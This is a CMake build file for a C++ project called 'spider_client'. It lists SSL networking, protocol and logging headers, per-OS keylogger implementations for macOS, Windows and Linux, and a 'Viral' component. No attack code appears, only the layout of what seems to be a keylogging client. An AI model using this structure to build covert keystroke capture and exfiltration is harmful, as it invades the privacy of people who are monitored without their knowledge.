cmake_minimum_required(VERSION 3.7)
project(spider_client)

##START CONFIG CMAKE
set(CMAKE_MODULE_PATH ${CMAKE_CURRENT_SOURCE_DIR}/cmake-utils/Module)
set(CMAKE_CONFIG_PATH ${CMAKE_CURRENT_SOURCE_DIR}/cmake-utils)

include(${CMAKE_CONFIG_PATH}/include.cmake)

PROJECT_FOLDER(${PROJECT_NAME})
STANDARD_COMPILATION_SETTINGS()
BOOST_CONFIG_SPIDER_CLIENT()
OPENSSL_CONFIG()
find_package (Threads)
if (VERBOSE)
    PRINT_BUILD_TYPE()
    PRINT_FLAGS_INFO()
endif ()
enable_testing()
include(CTest)

include_directories(Project)
include_directories(vendor/core/Project/core-utils/project)
include_directories(vendor/core/Project/core-network/project)

set(HEADERS_SPIDER_NETWORK
        Project/Network/IOManager.hpp
        Project/Network/ClientSession.hpp
        Project/Network/SSLContext.hpp
        Project/Network/SSLConnection.hpp)

set(HEADERS_SPIDER_PROTOCOL
        Project/Protocol/CommandHandler.hpp
        Project/Protocol/MessagesEnums.hpp
        Project/Protocol/Messages.hpp)

set(HEADERS_SPIDER_KEYLOGGER
        Project/KeyLogger/KeyLogger.hpp
        Project/KeyLogger/KeyLoggerFactory.hpp
        Project/Viral/Viral.hpp)

set(HEADERS_SPIDER_LOGGING
        Project/Logging/LogHandle.hpp
        Project/Logging/AbstractLogHandle.hpp)

set(HEADERS_SPIDER
        ${HEADERS_SPIDER_NETWORK}
        ${HEADERS_SPIDER_PROTOCOL}
        ${HEADERS_SPIDER_KEYLOGGER}
        ${HEADERS_SPIDER_LOGGING}
        Project/CSpiderCore.hpp
        Project/Configuration.hpp
        Project/Utils/ILoggable.hpp
        Project/Utils/Serialization.hpp
        Project/Utils/Stringification.hpp)

if (APPLE)
    set(HEADERS_SPIDER ${HEADERS_SPIDER} Project/KeyLogger/details/OSXKeyLogger.hpp Project/KeyLogger/details/OSXEventListener.hpp Project/KeyLogger/details/OSXKeyMatchingTable.hpp)
elseif(WIN32)
    set(HEADERS_SPIDER ${HEADERS_SPIDER}
            Project/KeyLogger/details/WinKeyLogger.hpp
            )
elseif(LINUX)
    set(HEADERS_SPIDER ${HEADERS_SPIDER} Project/KeyLogger/details/LinuxKeyLogger.hpp)
endif()

set(SOURCES_SPIDER Project/main.cpp)

add_executable(${PROJECT_NAME} ${SOURCES_SPIDER} ${HEADERS_SPIDER})

if (APPLE)
    FIND_LIBRARY(APP_SERVICES_LIBRARY ApplicationServices)
    target_link_libraries(${PROJECT_NAME} ${Boost_LIBRARIES} ${OPENSSL_LIBRARIES} ${CMAKE_THREAD_LIBS_INIT} ${APP_SERVICES_LIBRARY})
else()
    target_link_libraries(${PROJECT_NAME} ${Boost_LIBRARIES} ${OPENSSL_LIBRARIES} ${CMAKE_THREAD_LIBS_INIT})
endif()

add_subdirectory(test)
